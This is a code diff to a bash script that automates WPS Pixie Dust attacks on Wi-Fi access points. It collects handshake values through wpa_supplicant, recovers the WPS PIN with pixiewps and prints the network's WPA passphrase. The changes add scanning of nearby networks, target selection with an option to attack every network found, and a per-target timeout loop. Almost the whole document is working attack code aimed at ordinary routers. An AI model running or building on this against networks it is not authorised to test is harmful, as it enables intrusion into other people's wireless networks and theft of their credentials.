@@ -13,6 +13,7 @@ function usage()
 	echo -e "-i <interface> \tInterface name"
 	echo -e "-b <bssid>     \tTarget BSSID"
 	echo -e "-p <pin>       \tWPS pin to use (optional)"
+	echo -e "-t <seconds>   \tAttack timeout"
 	echo -e "-h             \tShow this help"
 	exit
 }
@@ -30,9 +31,9 @@ function pixie()
 	printI "Launching PixieWPS..."
 	TEMPOUT=$(mktemp)
 	pixiewps -e "$PKE" -r "$PKR" -s "$EHASH1" -z "$EHASH2" -a "$AUTHKEY" -n "$ENONCE" --force | tee $TEMPOUT
-	if [ "$?" -eq 0 ]
+	if [ "$(cat $TEMPOUT | grep "WPS pin:")" ]
 	then
-		PIN=$(cat $TEMPOUT | grep 'WPS pin' | awk '{print $4}')
+		PIN=$(cat $TEMPOUT | grep 'WPS pin:' | awk '{print $4}')
 		PIXIE_STATUS=SUCCESS
 	else
 		PIXIE_STATUS=FAIL
@@ -51,7 +52,7 @@ function attack()
 	wpa_supplicant -K -d -D nl80211 -i $IFACE -c $TEMPFILE > $FIFO &
 
 	#Send WPS_REG command to wpa_supplicant socket
-	sleep 5 && sendCMD &
+	sleep 1 && sendCMD &
 	BREAK=0
 
 	#Parse wpa_supplicant output
@@ -134,7 +135,7 @@ function parseWPS()
 		then
 			WPA_KEY=$(gethex "$LINE" | xxd -r -p)
 			printG "WPA pass: $WPA_KEY"
-			quit
+			BREAK=1
 		elif [[ $LINE =~ "Received WSC_NACK" ]]
 		then
 			printI 'Received WSC NACK'
@@ -182,6 +183,120 @@ function parseStatus()
 	fi
 }
 
+#Scanning networks and parsing output via awk scipt
+function scanNetworks()
+{
+	iw dev $IFACE scan |\
+	awk -v iface="$IFACE)" -f wifi.awk |\
+	sed --expression='s/(on//g' |\
+	sed --expression='s/.00//g' |\
+	sort -k 3
+}
+
+function fillArr()
+{
+	INPUT="$1"
+
+	for ELEMENT in "$INPUT"
+	do
+		echo -n "$ELEMENT "
+	done
+}
+
+function parseScanResults()
+{
+	printI "Scanning networks around..."
+	#Getting list of targets
+	TARGETS=$(scanNetworks)
+
+	#Checking, if networks with WPS were found
+	if [ "$TARGETS" ]
+	then
+		printG "Found targets:"
+	else
+		printE "No targets found"
+		quit
+	fi
+
+	#Filling BSSIDS array with MAC addresses
+	BSSIDS=($(fillArr "$(echo "$TARGETS" | awk '{print $1}')"))
+
+	#Filling ESSIDS array with networks names
+	ESSIDS=($(fillArr "$(echo "$TARGETS" | awk '{print $2}')"))
+
+	#Filling SIGNALS array with signal level
+	SIGNALS=($(fillArr "$(echo "$TARGETS" | awk '{print $3}')"))
+}
+
+function showScanResults()
+{
+	#Displaying to user scan results
+	echo -e "$BLUE[№]$DEFAULT\tPower\tBSSID\t\t\tESSID"
+	for TARGET in ${!BSSIDS[@]}
+	do
+		echo -e "[$((${TARGET}+1))]\t${SIGNALS[$TARGET]} db\t${BSSIDS[$TARGET]}\t${ESSIDS[$TARGET]}"
+	done
+}
+
+function chooseTargets()
+{
+	if [ ! "$ALL" ]
+	then
+		while true
+		do
+			printC "Choose targets to attack (space separated) or 'all'. Type 'r' to rescan networks: "
+			read CHOSEN
+			if [ "$CHOSEN" = "r" ]
+			then
+				parseScanResults
+				showScanResults
+				continue
+			else
+				break
+			fi
+		done
+	fi
+	if [ "$CHOSEN" = "all" ] || [ $ALL ]
+	then
+		printI "Attacking all targets!"
+		CHOSEN=${!BSSIDS[@]}
+		ALL="1"
+	fi
+}
+
+function setTimeout()
+{
+	printC "Set timeout for each target (0 - no timeout) [30]: "
+	read TIMEOUT
+	if [ ! $TIMEOUT ]
+	then
+		TIMEOUT=30
+	fi
+}
+
+function shoot()
+{
+	attack
+
+	#Run pixiewps if all required data is collected
+	if [ "$PKE" ]\
+	&& [ "$PKR" ]\
+	&& [ "$EHASH1" ]\
+	&& [ "$EHASH2" ]\
+	&& [ "$ENONCE" ]
+	then
+		pixie
+		if [ "$PIXIE_STATUS" = "SUCCESS" ]
+		then
+			printG "WPS pin: $(echo $PIN)"
+			attack
+		fi
+	else
+		printE "Not enough data to run PixieDust"
+	fi
+	sleep 5
+}
+
 #Output formatting
 DEFAULT="\e[0m"
 BLUE="\e[34m"
@@ -191,28 +306,35 @@ RED="\e[31m"
 function printI() { echo -e "$BLUE[*]$DEFAULT $@"; }
 function printE() { echo -e "$RED[-]$DEFAULT $@"; }
 function printG() { echo -e "$GREEN[+]$DEFAULT $@"; }
+function printC() { echo -n -e "$BLUE[*]$DEFAULT $@"; }
 
 #Parse arguments
-while getopts "i:b:p:h" opt
+while getopts "i:b:p:t:ha" opt
 do
-        case $opt in
-                i)
-                        IFACE=${OPTARG};;
-                b)
-                        BSSID=${OPTARG};;
-                p)
-                        PIN=${OPTARG};;
-                h)
-                        usage;;
-                *)
-                        usage;;
-        esac
+	case $opt in
+		i)
+			IFACE=${OPTARG};;
+		b)
+			BSSID=${OPTARG};;
+		p)
+			PIN=${OPTARG};;
+		t)
+			TIMEOUT=${OPTARG};;
+		a)
+			ALL=1;;
+		h)
+			usage;;
+		*)
+			usage;;
+	esac
 done
 
-#Start here
-#Check if BSSID and Interface provided
-if [ ! "$BSSID" ]\
-|| [ ! "$IFACE" ]
+#========================================
+#==============Start here================
+#========================================
+
+#Check if Interface provided
+if [ ! "$IFACE" ]
 then
 	usage
 fi
@@ -223,25 +345,54 @@ then
 	PIN=12345670
 fi
 
-writeConf
-attack
-
-#Run pixiewps if all required data is collected
-if [ "$PKE" ]\
-&& [ "$PKR" ]\
-&& [ "$EHASH1" ]\
-&& [ "$EHASH2" ]\
-&& [ "$ENONCE" ]
+if [ ! "$BSSID" ]
 then
-	pixie
-	if [ "$PIXIE_STATUS" = "SUCCESS" ]
-	then
-		printG "WPS pin: $(echo $PIN)"
-		attack
-	fi
+	parseScanResults
+	showScanResults
+	chooseTargets
 else
-	printE "Not enough data to run PixieDust"
+	BSSIDS=($BSSID)
+	CHOSEN=0
 fi
+
+if [ ! "$TIMEOUT" ]
+then
+	setTimeout
+fi
+
+writeConf
+
+#Main loop
+for TARGET in $CHOSEN
+do
+	#Adjusting array indexes from user input
+	if [ ! $ALL ]
+	then
+		TARGET=$(($TARGET-1))
+	fi
+	
+	printI "Shooting at ${BSSIDS[$TARGET]}"
+	
+	if [ ! "$BSSID" ]
+	then
+		BSSID="${BSSIDS[$TARGET]}"
+	fi
+
+	shoot &
+
+	#Starting timeout timer
+	if [ $TIMEOUT -gt 0 ]
+	then
+		sleep $(($TIMEOUT+1)) && printE "Timeout!" &&\
+			killall -9 wpa_supplicant &&\
+			printI "Killed wpa_supplicant process"
+		sleep 2
+	fi
+
+	BSSID=''
+	wait
+done
+
 
 #Remove temp files and exit
 quit
